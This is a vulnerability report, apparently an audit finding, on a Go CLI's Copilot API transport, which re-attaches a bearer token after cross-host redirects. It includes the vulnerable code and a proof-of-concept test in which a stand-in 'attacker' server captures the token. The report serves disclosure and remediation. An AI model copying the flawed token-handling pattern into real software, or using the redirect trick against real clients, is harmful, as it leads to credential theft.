### Title
Cross-host redirect causes CAPI Bearer token to be resent to an attacker-controlled host - (File: pkg/cmd/agent-task/capi/client.go)

### Summary
`capiTransport.RoundTrip` unconditionally sets `Authorization: Bearer <token>` on every request it round-trips, without checking `req.URL.Host`. Because `NewCAPIClient` installs this transport on a plain `*http.Client` with no custom `CheckRedirect`, Go's default redirect-following behavior applies: after a 3xx response, the client normally strips `Authorization` when the redirect target's host differs from the original request's host, but that stripped header is unconditionally re-added by this transport before the redirected request is sent, defeating the built-in protection.

### Finding Description
`CreateJob` (and `GetJob`) build a request to the CAPI base URL and call `c.httpClient.Do(req)` [1](#0-0) . `NewCAPIClient` wraps the client's transport with `capiTransport` and does not set a custom `CheckRedirect`, so `http.Client`'s default redirect policy (follow up to 10 redirects) applies [2](#0-1) .

When Go's `http.Client` follows a redirect to a different host, it constructs a new `*http.Request` and, per `net/http`'s built-in `shouldCopyHeaderOnRedirect` logic, omits sensitive headers such as `Authorization` from that new request when the host changes. That new request is then passed into the installed `RoundTripper` — here, `capiTransport.RoundTrip`:

```go
func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)
	...
	return ct.rp.RoundTrip(req)
}
``` [3](#0-2) 

Line 65 unconditionally re-attaches the bearer token to *every* request that reaches `RoundTrip`, including the redirected request going to the new (potentially attacker-controlled) host. Notably, the code does perform a host check for other headers (`req.URL.Host == ct.capiHost` at line 70) but this check is not applied to the `Authorization` header set at line 65 — an inconsistency that shows the host-scoping was implemented for some headers but omitted for the most sensitive one.

Attack flow: an attacker who controls responses from the CAPI/API host the victim's `gh` is configured against (e.g., a malicious GitHub Enterprise-like host, per the stated precondition) responds to the `CreateJob` POST with a 3xx status and a `Location` header pointing to an attacker-controlled host. `http.Client` follows the redirect, builds the new request without `Authorization` (per Go defaults), but `capiTransport.RoundTrip` re-adds `Authorization: Bearer <token>` before forwarding to the underlying transport, causing the token to be sent to the attacker's host.

### Impact Explanation
This results in exfiltration of the Copilot/CAPI bearer token to an attacker-controlled host via a simple HTTP redirect, matching the "credential/token exfiltration to unintended host" impact class. The token could then potentially be used to impersonate the victim's session against the real CAPI/GitHub API within its validity/scope.

### Likelihood Explanation
Feasibility is high once the stated precondition holds: the attacker controls the CAPI/API server's HTTP responses (e.g., victim points `gh`/Copilot CLI at an attacker-controlled or compromised enterprise host). No other privileges, MITM, or social engineering beyond that host-control precondition are required, and the redirect-following/token-reattachment behavior is deterministic and repeatable on every request through this transport.

### Recommendation
In `capiTransport.RoundTrip`, only set the `Authorization` header when the destination host matches an expected/allowed host (e.g., `ct.capiHost` or the configured GitHub API host), mirroring the existing host check used for `Copilot-Integration-Id`/`X-GitHub-Api-Version`. Additionally, consider setting an explicit `CheckRedirect` on the `http.Client` in `NewCAPIClient` that refuses to follow redirects to hosts outside an allowlist, rather than relying solely on header-stripping behavior that this transport currently undermines.

### Proof of Concept
```go
func TestCapiTransport_DoesNotLeakTokenCrossHostRedirect(t *testing.T) {
	var attackerGotAuth string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerGotAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	capi := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, attacker.URL+"/jobs", http.StatusFound)
	}))
	defer capi.Close()

	httpClient := &http.Client{}
	capiClient := capi_pkg.NewCAPIClient(httpClient, "SECRET_TOKEN", "example.com", capi.URL)

	_, _ = capiClient.CreateJob(context.Background(), "owner", "repo", "do thing", "", "")

	if attackerGotAuth != "" {
		t.Fatalf("expected Authorization header to be stripped on cross-host redirect, got %q", attackerGotAuth)
	}
}
```
Expected (secure) result: `attackerGotAuth` is empty. Actual (vulnerable) result: `attackerGotAuth` equals `"Bearer SECRET_TOKEN"`, confirming the token is resent to the attacker-controlled host.

func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)
}
